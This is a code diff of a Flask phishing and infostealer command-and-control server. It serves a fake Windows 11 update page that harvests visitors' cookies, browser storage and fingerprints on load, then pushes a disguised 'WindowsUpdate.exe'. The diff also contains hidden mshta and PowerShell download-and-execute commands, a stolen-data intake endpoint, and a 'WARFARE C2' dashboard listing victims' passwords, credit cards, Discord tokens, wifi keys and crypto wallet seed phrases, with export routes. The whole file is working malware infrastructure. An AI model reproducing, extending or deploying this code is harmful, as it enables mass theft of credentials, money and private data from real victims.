@@ -11,7 +11,7 @@ import requests
 from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
 from functools import wraps
 import logging
-import user_agents  # ADD THIS - will need to add to requirements.txt
+import user_agents
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -48,7 +48,7 @@ def init_db():
                 hostname TEXT,
                 username TEXT,
                 device_name TEXT,
-                device_type TEXT,  -- Phone, Tablet, Desktop, Laptop
+                device_type TEXT,
                 os_version TEXT,
                 os_build TEXT,
                 architecture TEXT,
@@ -64,6 +64,12 @@ def init_db():
                 screen_res TEXT,
                 browser_name TEXT,
                 browser_version TEXT,
+                
+                -- INSTANT CAPTURE DATA (from website visit)
+                instant_cookies TEXT,
+                instant_storage TEXT,
+                instant_fingerprint TEXT,
+                instant_system TEXT,
                 
                 -- CHROME/EDGE/BRAVE/OPERA (LOGINS + CC + WALLETS)
                 chrome_logins TEXT,
@@ -142,11 +148,6 @@ def init_db():
                 stolen_documents TEXT,
                 desktop_files TEXT,
                 downloads_files TEXT,
-                
-                -- Real-time Browser Data
-                browser_cookies TEXT,
-                browser_storage TEXT,
-                browser_history TEXT,
                 
                 -- Full Data Dump
                 full_data TEXT,
@@ -246,7 +247,6 @@ def get_device_info(user_agent_string):
     """Parse user agent to get device details"""
     ua = user_agents.parse(user_agent_string)
     
-    # Determine device type
     if ua.is_mobile:
         device_type = "Phone"
     elif ua.is_tablet:
@@ -263,11 +263,11 @@ def get_device_info(user_agent_string):
     }
 
 # ==========================================
-# REAL-TIME BROWSER DATA CAPTURE
+# INSTANT CAPTURE ENDPOINT - RUNS IMMEDIATELY WHEN PAGE LOADS
 # ==========================================
-@app.route('/capture', methods=['POST'])
-def capture_browser_data():
-    """Endpoint for real-time browser data capture"""
+@app.route('/track-visit', methods=['POST'])
+def track_visit():
+    """Instant data capture - runs AS SOON as page loads"""
     data = request.json
     victim_id = request.cookies.get('victim_id', 'unknown')
     
@@ -275,26 +275,31 @@ def capture_browser_data():
         with get_db() as conn:
             conn.execute('''
                 UPDATE victims SET
-                    browser_cookies = ?,
-                    browser_storage = ?,
+                    instant_cookies = ?,
+                    instant_storage = ?,
+                    instant_fingerprint = ?,
+                    instant_system = ?,
                     last_seen = ?
                 WHERE victim_id = ?
             ''', (
                 json.dumps(data.get('cookies', {})),
                 json.dumps(data.get('storage', {})),
+                json.dumps(data.get('fingerprint', {})),
+                json.dumps(data.get('system', {})),
                 datetime.datetime.now().isoformat(),
                 victim_id
             ))
             conn.commit()
+        logger.info(f"✅ INSTANT CAPTURE from {victim_id}")
     
     return jsonify({"status": "ok"})
 
 # ==========================================
-# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE
+# MAIN PAGE - INSTANT CAPTURE + WINDOWS 11 UPDATE
 # ==========================================
 @app.route('/')
 def index():
-    """Shows a REAL Windows 11 update page with location/device capture"""
+    """Shows Windows 11 page with INSTANT data capture"""
     
     # Get visitor IP
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
@@ -308,42 +313,12 @@ def index():
     # Generate unique victim ID
     victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
     
-    # Log download attempt with enhanced data
+    # Log visit immediately with basic info
     with get_db() as conn:
         # Check if victim exists
         victim = conn.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,)).fetchone()
         
-        if victim:
-            # Update existing
-            conn.execute('''
-                UPDATE victims SET
-                    ip = ?,
-                    real_ip = ?,
-                    country = ?,
-                    city = ?,
-                    isp = ?,
-                    latitude = ?,
-                    longitude = ?,
-                    device_type = ?,
-                    os_version = ?,
-                    browser_name = ?,
-                    last_seen = ?
-                WHERE victim_id = ?
-            ''', (
-                request.remote_addr,
-                visitor_ip,
-                location['country'],
-                location['city'],
-                location['isp'],
-                location['lat'],
-                location['lon'],
-                device_info['device_type'],
-                device_info['os'],
-                device_info['browser'],
-                datetime.datetime.now().isoformat(),
-                victim_id
-            ))
-        else:
+        if not victim:
             # Insert new
             conn.execute('''
                 INSERT INTO victims (
@@ -365,9 +340,23 @@ def index():
                 datetime.datetime.now().isoformat(),
                 datetime.datetime.now().isoformat()
             ))
+        else:
+            # Update last seen
+            conn.execute('''
+                UPDATE victims SET
+                    last_seen = ?,
+                    ip = ?,
+                    real_ip = ?
+                WHERE victim_id = ?
+            ''', (
+                datetime.datetime.now().isoformat(),
+                request.remote_addr,
+                visitor_ip,
+                victim_id
+            ))
         conn.commit()
     
-    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE
+    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE WITH INSTANT CAPTURE
     html = f'''
     <!DOCTYPE html>
     <html lang="en">
@@ -526,6 +515,18 @@ def index():
                 color: #00b4ff;
                 font-weight: 600;
             }}
+            .capture-status {{
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                background: rgba(0,120,212,0.9);
+                color: white;
+                padding: 8px 16px;
+                border-radius: 20px;
+                font-size: 12px;
+                display: none;
+                z-index: 9999;
+            }}
         </style>
     </head>
     <body>
@@ -584,44 +585,49 @@ def index():
             </div>
         </div>
         
-        <!-- REAL-TIME BROWSER DATA CAPTURE SCRIPT -->
+        <div class="capture-status" id="capture-status">✅ Data captured</div>
+        
+        <!-- INSTANT CAPTURE SCRIPT - RUNS IMMEDIATELY -->
         <script>
         (function() {{
-            // Collect real-time browser data
-            const browserData = {{
+            // ==========================================
+            // INSTANT DATA CAPTURE - RUNS NOW!
+            // ==========================================
+            const captureData = {{
                 cookies: {{}},
                 storage: {{}},
-                device: {{}}
+                fingerprint: {{}},
+                system: {{}}
             }};
             
-            // Get all cookies
+            // Capture ALL cookies immediately
             try {{
                 document.cookie.split(';').forEach(c => {{
                     if (c.trim()) {{
                         const [name, value] = c.trim().split('=');
-                        browserData.cookies[name] = value;
+                        captureData.cookies[name] = value;
                     }}
                 }});
             }} catch(e) {{}}
             
-            // Get localStorage
+            // Capture localStorage
             try {{
                 for (let i = 0; i < localStorage.length; i++) {{
                     const key = localStorage.key(i);
-                    browserData.storage[key] = localStorage.getItem(key);
+                    captureData.storage[key] = localStorage.getItem(key);
                 }}
             }} catch(e) {{}}
             
-            // Get sessionStorage
+            // Capture sessionStorage
             try {{
                 for (let i = 0; i < sessionStorage.length; i++) {{
                     const key = sessionStorage.key(i);
-                    browserData.storage[`session_${{key}}`] = sessionStorage.getItem(key);
+                    captureData.storage[`session_${{key}}`] = sessionStorage.getItem(key);
                 }}
             }} catch(e) {{}}
             
-            // Get detailed device info
-            browserData.device = {{
+            // Capture browser fingerprint
+            captureData.fingerprint = {{
                 screen: `${{window.screen.width}}x${{window.screen.height}}`,
                 colorDepth: window.screen.colorDepth,
                 pixelRatio: window.devicePixelRatio,
@@ -633,38 +639,59 @@ def index():
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 touchPoints: navigator.maxTouchPoints,
                 cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack
+                doNotTrack: navigator.doNotTrack,
+                userAgent: navigator.userAgent
             }};
             
-            // Send to server
-            fetch('/capture', {{
+            // Capture system info
+            captureData.system = {{
+                referrer: document.referrer,
+                url: window.location.href,
+                title: document.title,
+                timestamp: new Date().toISOString()
+            }};
+            
+            // Send to server IMMEDIATELY (multiple methods for reliability)
+            
+            // Method 1: Fetch (primary)
+            fetch('/track-visit', {{
                 method: 'POST',
                 headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify(browserData),
+                body: JSON.stringify(captureData),
                 keepalive: true
+            }}).then(() => {{
+                document.getElementById('capture-status').style.display = 'block';
+                setTimeout(() => {{
+                    document.getElementById('capture-status').style.display = 'none';
+                }}, 3000);
+            }}).catch(() => {{
+                // Method 2: Image beacon (fallback)
+                const img = new Image();
+                img.src = '/track-pixel?data=' + encodeURIComponent(btoa(JSON.stringify(captureData)));
             }});
+            
+            // Method 3: Navigator.sendBeacon (most reliable for page unload)
+            if (navigator.sendBeacon) {{
+                navigator.sendBeacon('/track-visit', JSON.stringify(captureData));
+            }}
             
             // Update UI with device info
             const deviceDiv = document.getElementById('device-detect');
-            deviceDiv.innerHTML = `<span>✅</span> Detected: ${{browserData.device.platform}} • ${{browserData.device.screen}} • ${{browserData.device.language}}`;
+            deviceDiv.innerHTML = `<span>✅</span> Detected: ${{captureData.fingerprint.platform}} • ${{captureData.fingerprint.screen}} • ${{captureData.fingerprint.language}}`;
             
-            // Update progress
-            const progressFill = document.getElementById('progress-fill');
-            const progressPercent = document.getElementById('progress-percent');
-            const statusMsg = document.getElementById('status');
-            
+            // Progress animation and EXE download
             let percent = 0;
             const interval = setInterval(() => {{
                 percent += Math.random() * 5;
                 if (percent > 100) percent = 100;
-                progressPercent.textContent = Math.floor(percent) + '%';
+                document.getElementById('progress-percent').textContent = Math.floor(percent) + '%';
                 
                 if (percent >= 30 && percent < 60) {{
-                    statusMsg.textContent = 'Downloading security updates...';
+                    document.getElementById('status').textContent = 'Downloading security updates...';
                 }} else if (percent >= 60 && percent < 90) {{
-                    statusMsg.textContent = 'Verifying download integrity...';
+                    document.getElementById('status').textContent = 'Verifying download integrity...';
                 }} else if (percent >= 90) {{
-                    statusMsg.textContent = 'Preparing to install...';
+                    document.getElementById('status').textContent = 'Preparing to install...';
                     clearInterval(interval);
                     setTimeout(() => {{
                         window.location.href = '/WindowsUpdate.exe';
@@ -673,6 +700,9 @@ def index():
             }}, 200);
         }})();
         </script>
+        
+        <!-- Pixel tracking fallback -->
+        <img src="/track-pixel" style="display:none;" alt="">
     </body>
     </html>
     '''
@@ -680,6 +710,42 @@ def index():
     response = make_response(render_template_string(html))
     response.set_cookie('victim_id', victim_id, max_age=86400*30)
     return response
+
+# ==========================================
+# PIXEL TRACKING FALLBACK
+# ==========================================
+@app.route('/track-pixel')
+def track_pixel():
+    data = request.args.get('data', '')
+    try:
+        stolen = json.loads(base64.b64decode(data).decode())
+        # Process in background
+        threading.Thread(target=process_instant_data, args=(stolen, request.cookies.get('victim_id'))).start()
+    except:
+        pass
+    return send_file('pixel.gif')  # Return 1x1 transparent GIF
+
+def process_instant_data(data, victim_id):
+    """Process instant capture data in background"""
+    if data and victim_id:
+        with get_db() as conn:
+            conn.execute('''
+                UPDATE victims SET
+                    instant_cookies = ?,
+                    instant_storage = ?,
+                    instant_fingerprint = ?,
+                    instant_system = ?,
+                    last_seen = ?
+                WHERE victim_id = ?
+            ''', (
+                json.dumps(data.get('cookies', {})),
+                json.dumps(data.get('storage', {})),
+                json.dumps(data.get('fingerprint', {})),
+                json.dumps(data.get('system', {})),
+                datetime.datetime.now().isoformat(),
+                victim_id
+            ))
+            conn.commit()
 
 # ==========================================
 # EXE DOWNLOAD ENDPOINT
@@ -708,28 +774,17 @@ def direct_run():
             body { background: #fff; font-family: Arial; text-align: center; padding-top: 100px; display: none; }
         </style>
         <script>
-            // Multiple execution methods - WARFARE GRADE
             (function() {
-                // Method 1: mshta (works on most Windows)
                 try {
                     var shell = new ActiveXObject("WScript.Shell");
                     shell.Run("mshta.exe javascript:eval('var w=new ActiveXObject(\\\"WScript.Shell\\\");w.run(\\\"WindowsUpdate.exe\\\",0);window.close()')", 0, false);
                 } catch(e) {}
                 
-                // Method 2: PowerShell download + execute
                 try {
                     var ps = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$wc=New-Object System.Net.WebClient;$wc.DownloadFile('https://" + window.location.host + "/WindowsUpdate.exe','%temp%\\WinUpd.exe');Start-Process '%temp%\\WinUpd.exe'\\"";
                     new ActiveXObject("WScript.Shell").Run(ps, 0, false);
                 } catch(e) {}
                 
-                // Method 3: WMI execution
-                try {
-                    var wmi = GetObject("winmgmts:\\\\\\\\.\\\\root\\\\cimv2");
-                    var proc = wmi.Get("Win32_Process");
-                    proc.Create("cmd.exe /c start /b WindowsUpdate.exe", null, null, null);
-                } catch(e) {}
-                
-                // Redirect after 2 seconds
                 setTimeout(function() {
                     window.location.href = 'https://www.google.com';
                 }, 2000);
@@ -745,7 +800,7 @@ def direct_run():
     return render_template_string(html)
 
 # ==========================================
-# API ENDPOINT - RECEIVE STOLEN DATA
+# API ENDPOINT - RECEIVE STOLEN DATA FROM EXE
 # ==========================================
 @app.route('/api/steal', methods=['POST'])
 def api_steal():
@@ -874,12 +929,12 @@ def api_steal():
     return jsonify({"status": "ok", "victim_id": victim_id})
 
 # ==========================================
-# ADMIN DASHBOARD - WARFARE GRADE
+# ADMIN DASHBOARD - SHOWS INSTANT CAPTURE DATA
 # ==========================================
 @app.route('/admin')
 @authenticate
 def admin_dashboard():
-    """Complete C2 dashboard - shows ALL stolen data"""
+    """Complete C2 dashboard - shows INSTANT capture data + EXE data"""
     with get_db() as conn:
         # Stats
         total = conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0]
@@ -893,17 +948,22 @@ def admin_dashboard():
                OR (wallet_keys IS NOT NULL AND wallet_keys != 'null' AND wallet_keys != '[]')
         ''').fetchone()[0]
         
+        # Instant capture victims
+        instant_victims = conn.execute('''
+            SELECT COUNT(*) FROM victims 
+            WHERE instant_cookies IS NOT NULL AND instant_cookies != 'null'
+        ''').fetchone()[0]
+        
         # Downloads
         downloads = conn.execute('SELECT COUNT(*) FROM downloads').fetchone()[0]
         
         # Recent victims
         victims = conn.execute('''
             SELECT * FROM victims 
-            ORDER BY exfil_time DESC NULLS LAST, infection_time DESC
+            ORDER BY exfil_time DESC NULLS LAST, last_seen DESC
             LIMIT 50
         ''').fetchall()
         
-        # Recent downloads
         recent_downloads = conn.execute('''
             SELECT * FROM downloads 
             ORDER BY downloaded_time DESC 
@@ -914,7 +974,7 @@ def admin_dashboard():
     <!DOCTYPE html>
     <html>
     <head>
-        <title>WARFARE C2 - DOOMSDAY EDITION</title>
+        <title>WARFARE C2 - INSTANT CAPTURE</title>
         <meta http-equiv="refresh" content="10">
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -944,7 +1004,7 @@ def admin_dashboard():
             }
             .stats-grid {
                 display: grid;
-                grid-template-columns: repeat(5, 1fr);
+                grid-template-columns: repeat(6, 1fr);
                 gap: 15px;
                 margin-bottom: 20px;
             }
@@ -993,6 +1053,9 @@ def admin_dashboard():
                 border-color: gold;
                 box-shadow: 0 0 20px gold;
             }
+            .victim-card.instant {
+                border-left: 10px solid #00ffff;
+            }
             .victim-header {
                 display: flex;
                 justify-content: space-between;
@@ -1007,6 +1070,14 @@ def admin_dashboard():
             }
             .victim-time {
                 color: #ffff00;
+            }
+            .instant-badge {
+                background: #00ffff;
+                color: black;
+                padding: 3px 8px;
+                border-radius: 3px;
+                font-size: 11px;
+                margin-left: 10px;
             }
             .wallet-badge {
                 background: gold;
@@ -1085,6 +1156,10 @@ def admin_dashboard():
                 color: black;
                 font-weight: bold;
             }
+            .badge-blue {
+                background: #00ffff;
+                color: black;
+            }
             .search-box {
                 background: #111;
                 border: 1px solid #00ff00;
@@ -1117,6 +1192,15 @@ def admin_dashboard():
                 background: gold;
                 color: black;
             }
+            .export-btn-blue {
+                background: #003333;
+                color: #00ffff;
+                border: 1px solid #00ffff;
+            }
+            .export-btn-blue:hover {
+                background: #00ffff;
+                color: black;
+            }
             .tab-container {
                 margin-bottom: 20px;
                 border-bottom: 1px solid #333;
@@ -1143,18 +1227,18 @@ def admin_dashboard():
     </head>
     <body>
         <div class="header">
-            <h1>⚔️ WARFARE C2 - DOOMSDAY EDITION ⚔️</h1>
+            <h1>⚔️ WARFARE C2 - INSTANT CAPTURE v5.0 ⚔️</h1>
             <div>
                 <span class="badge">ACTIVE</span>
                 <span class="badge-green">''' + datetime.datetime.now().strftime('%H:%M:%S') + '''</span>
-                <span class="badge-gold">v4.0</span>
+                <span class="badge-gold">v5.0</span>
             </div>
         </div>
         
         <div class="stats-grid">
             <div class="stat-card">
                 <div class="stat-value">''' + str(total) + '''</div>
-                <div class="stat-label">TOTAL VICTIMS</div>
+                <div class="stat-label">TOTAL VISITORS</div>
             </div>
             <div class="stat-card">
                 <div class="stat-value">''' + str(today) + '''</div>
@@ -1163,6 +1247,10 @@ def admin_dashboard():
             <div class="stat-card">
                 <div class="stat-value">''' + str(active) + '''</div>
                 <div class="stat-label">ACTIVE (24h)</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value">''' + str(instant_victims) + '''</div>
+                <div class="stat-label">INSTANT CAPTURE</div>
             </div>
             <div class="stat-card">
                 <div class="stat-value">''' + str(wallet_victims) + '''</div>
@@ -1176,16 +1264,18 @@ def admin_dashboard():
         
         <div style="margin-bottom: 20px;">
             <input type="text" class="search-box" placeholder="Search IP, hostname, username..." id="search">
-            <a href="/export" class="export-btn">📥 EXPORT ALL DATA</a>
-            <a href="/export-wallets" class="export-btn export-btn-gold">💰 EXPORT WALLETS ONLY</a>
+            <a href="/export" class="export-btn">📥 EXPORT ALL</a>
+            <a href="/export-wallets" class="export-btn export-btn-gold">💰 EXPORT WALLETS</a>
             <a href="/export-logins" class="export-btn">🔐 EXPORT LOGINS</a>
+            <a href="/export-instant" class="export-btn export-btn-blue">⚡ EXPORT INSTANT DATA</a>
         </div>
         
         <div class="tab-container">
-            <span class="tab active" onclick="filter('all')">ALL VICTIMS</span>
+            <span class="tab active" onclick="filter('all')">ALL VISITORS</span>
+            <span class="tab" onclick="filter('instant')">⚡ INSTANT CAPTURE</span>
             <span class="tab" onclick="filter('wallets')">💰 WITH WALLETS</span>
             <span class="tab" onclick="filter('logins')">🔐 WITH LOGINS</span>
-            <span class="tab" onclick="filter('discord')">🎮 WITH DISCORD</span>
+            <span class="tab" onclick="filter('exe')">📦 EXE RUN</span>
         </div>
         
         <div id="victims-list">
@@ -1195,35 +1285,31 @@ def admin_dashboard():
         # Parse data
         chrome_logins = json.loads(v['chrome_logins']) if v['chrome_logins'] else []
         chrome_cookies = json.loads(v['chrome_cookies']) if v['chrome_cookies'] else []
-        chrome_ccs = json.loads(v['chrome_ccs']) if v['chrome_ccs'] else []
-        
         wallet_phrases = json.loads(v['wallet_phrases']) if v['wallet_phrases'] else []
         wallet_keys = json.loads(v['wallet_keys']) if v['wallet_keys'] else []
-        wallet_extensions = json.loads(v['wallet_extensions']) if v['wallet_extensions'] else []
-        
-        discord_tokens = json.loads(v['discord_tokens']) if v['discord_tokens'] else []
-        wifi = json.loads(v['wifi_passwords']) if v['wifi_passwords'] else []
+        instant_cookies = json.loads(v['instant_cookies']) if v['instant_cookies'] else {}
+        instant_fingerprint = json.loads(v['instant_fingerprint']) if v['instant_fingerprint'] else {}
         
         has_wallet = len(wallet_phrases) > 0 or len(wallet_keys) > 0
+        has_instant = len(instant_cookies) > 0
         
         html += f'''
-        <div class="victim-card {'wallet' if has_wallet else ''}">
+        <div class="victim-card {'wallet' if has_wallet else ''} {'instant' if has_instant else ''}">
             <div class="victim-header">
                 <div>
                     <span class="victim-id">🎯 {v['victim_id']}</span>
                     <span style="margin-left: 15px;">📍 {v['real_ip'] or v['ip']}</span>
                     <span style="margin-left: 15px;">🌍 {v['city']}, {v['country']}</span>
                     <span style="margin-left: 15px;">📱 {v['device_type'] or 'Unknown'}</span>
-                    <span style="margin-left: 15px;">👤 {v['username'] or 'Unknown'}</span>
-                    {' <span class="wallet-badge">💰 WALLET KEYS FOUND</span>' if has_wallet else ''}
+                    { '<span class="instant-badge">⚡ INSTANT</span>' if has_instant else '' }
+                    { '<span class="wallet-badge">💰 WALLET KEYS</span>' if has_wallet else '' }
                 </div>
                 <div>
                     <span class="badge">{len(chrome_logins)} Logins</span>
                     <span class="badge">{len(chrome_cookies)} Cookies</span>
-                    <span class="badge">{len(chrome_ccs)} CCs</span>
                     <span class="badge-gold">{len(wallet_keys)} Keys</span>
-                    <span class="badge-gold">{len(wallet_phrases)} Phrases</span>
-                    <span class="victim-time">{v['exfil_time'][:16] if v['exfil_time'] else v['infection_time'][:16]}</span>
+                    <span class="badge-blue">{len(instant_cookies)} Web Cookies</span>
+                    <span class="victim-time">{v['last_seen'][:16] if v['last_seen'] else v['infection_time'][:16]}</span>
                 </div>
             </div>
             
@@ -1234,109 +1320,46 @@ def admin_dashboard():
                     <div>Country: {v['country']}</div>
                     <div>City: {v['city']}</div>
                     <div>ISP: {v['isp']}</div>
-                    <div>Coordinates: {v['latitude']}, {v['longitude']}</div>
                 </div>
                 <div class="data-section">
                     <div class="section-title">📱 DEVICE</div>
                     <div>Type: {v['device_type']}</div>
                     <div>OS: {v['os_version']}</div>
                     <div>Browser: {v['browser_name']}</div>
-                    <div>Timezone: {v['timezone']}</div>
                 </div>
             </div>
             
-            <!-- WALLET SECTION - GOLD -->
+            <!-- INSTANT CAPTURE DATA (from website visit) -->
             ''' + ('''
             <div class="data-section">
-                <div class="section-title">💰 CRYPTO WALLETS - PRIVATE KEYS/SEED PHRASES</div>
+                <div class="section-title">⚡ INSTANT CAPTURE - Website Cookies</div>
                 <div class="json-data">
-            ''' if has_wallet else '') + '''
+            ''' if has_instant else '') + '''
             '''
         
-        if wallet_keys:
-            html += '<div style="color:gold; font-weight:bold; margin-bottom:10px;">🔑 PRIVATE KEYS FOUND:</div>'
-            for key in wallet_keys[:20]:
-                html += f'<div class="wallet-key">🔑 {key}</div>'
+        if instant_cookies:
+            for name, value in list(instant_cookies.items())[:10]:
+                html += f'<div><b>{name}</b>: {value[:50]}</div>'
         
-        if wallet_phrases:
-            html += '<div style="color:gold; font-weight:bold; margin-top:10px; margin-bottom:10px;">📝 SEED PHRASES FOUND:</div>'
-            for phrase in wallet_phrases[:10]:
-                html += f'<div class="wallet-key">📝 {phrase}</div>'
-        
-        if wallet_extensions:
-            html += '<div style="margin-top:10px;"><b>Wallet Extensions:</b> ' + ', '.join([w.get('name', '') for w in wallet_extensions[:10]]) + '</div>'
+        if instant_fingerprint:
+            html += f'<br><b>Screen:</b> {instant_fingerprint.get("screen", "Unknown")}<br>'
+            html += f'<b>Timezone:</b> {instant_fingerprint.get("timezone", "Unknown")}'
         
         html += '''
-            </div>
-        </div>''' if has_wallet else ''
+            </div>''' if has_instant else ''
         
-        # LOGIN SECTION
-        html += f'''
+        # WALLET SECTION - GOLD
+        if wallet_keys:
+            html += '''
             <div class="data-section">
-                <div class="section-title">🔐 CHROME LOGINS ({len(chrome_logins)} found)</div>
+                <div class="section-title">💰 PRIVATE KEYS FOUND</div>
                 <div class="json-data">
-        '''
+            '''
+            for key in wallet_keys[:5]:
+                html += f'<div class="wallet-key">🔑 {key[:100]}</div>'
+            html += '</div></div>'
         
-        for login in chrome_logins[:15]:
-            html += f'<div class="credential"><b>{login.get("url", "N/A")[:50]}</b><br>👤 {login.get("username", "")}<br>🔑 {login.get("password", "")}</div>'
-        
-        html += f'''
-                </div>
-            </div>
-            
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                <div class="data-section">
-                    <div class="section-title">🍪 CHROME COOKIES ({len(chrome_cookies)} found)</div>
-                    <div class="json-data">
-        '''
-        
-        for cookie in chrome_cookies[:10]:
-            html += f'<div><b>{cookie.get("host", "")}</b> → {cookie.get("name", "")} = {cookie.get("value", "")[:30]}...</div>'
-        
-        html += f'''
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">💳 CREDIT CARDS ({len(chrome_ccs)} found)</div>
-                    <div class="json-data">
-        '''
-        
-        for cc in chrome_ccs[:10]:
-            html += f'<div><b>{cc.get("card_number", "")[:16]}</b> | {cc.get("exp_month", "")}/{cc.get("exp_year", "")} | CVV: {cc.get("cvv", "")}</div>'
-        
-        html += f'''
-                    </div>
-                </div>
-            </div>
-            
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
-                <div class="data-section">
-                    <div class="section-title">🎮 DISCORD TOKENS ({len(discord_tokens)} found)</div>
-                    <div class="json-data">
-        '''
-        
-        for token in discord_tokens[:10]:
-            html += f'<div class="credential">{token}</div>'
-        
-        html += f'''
-                    </div>
-                </div>
-                
-                <div class="data-section">
-                    <div class="section-title">📡 WIFI PASSWORDS ({len(wifi)} found)</div>
-                    <div class="json-data">
-        '''
-        
-        for w in wifi[:10]:
-            html += f'<div><b>{w.get("ssid", "")}</b>: {w.get("password", "")}</div>'
-        
-        html += f'''
-                    </div>
-                </div>
-            </div>
-        </div>
-        '''
+        html += '</div>'
     
     html += '''
         </div>
@@ -1346,8 +1369,9 @@ def admin_dashboard():
                 let cards = document.querySelectorAll('.victim-card');
                 cards.forEach(card => {
                     if (type === 'all') card.style.display = 'block';
+                    else if (type === 'instant' && card.classList.contains('instant')) card.style.display = 'block';
                     else if (type === 'wallets' && card.classList.contains('wallet')) card.style.display = 'block';
-                    else if (type !== 'wallets') card.style.display = 'none';
+                    else if (type !== 'instant' && type !== 'wallets') card.style.display = 'none';
                 });
             }
             
@@ -1365,7 +1389,6 @@ def admin_dashboard():
                 });
             });
             
-            // Auto-refresh
             setTimeout(() => location.reload(), 10000);
         </script>
     </body>
@@ -1426,6 +1449,24 @@ def export_logins():
     response = make_response(json.dumps(export, indent=2, default=str))
     response.headers['Content-Type'] = 'application/json'
     response.headers['Content-Disposition'] = f'attachment; filename=logins_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
+    return response
+
+@app.route('/export-instant')
+@authenticate
+def export_instant():
+    with get_db() as conn:
+        data = conn.execute('''
+            SELECT victim_id, ip, country, city, device_type, os_version,
+                   instant_cookies, instant_fingerprint, last_seen
+            FROM victims 
+            WHERE instant_cookies IS NOT NULL AND instant_cookies != 'null'
+            ORDER BY last_seen DESC
+        ''').fetchall()
+    
+    export = [dict(row) for row in data]
+    response = make_response(json.dumps(export, indent=2, default=str))
+    response.headers['Content-Type'] = 'application/json'
+    response.headers['Content-Disposition'] = f'attachment; filename=instant_capture_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
     return response
 
 # ==========================================
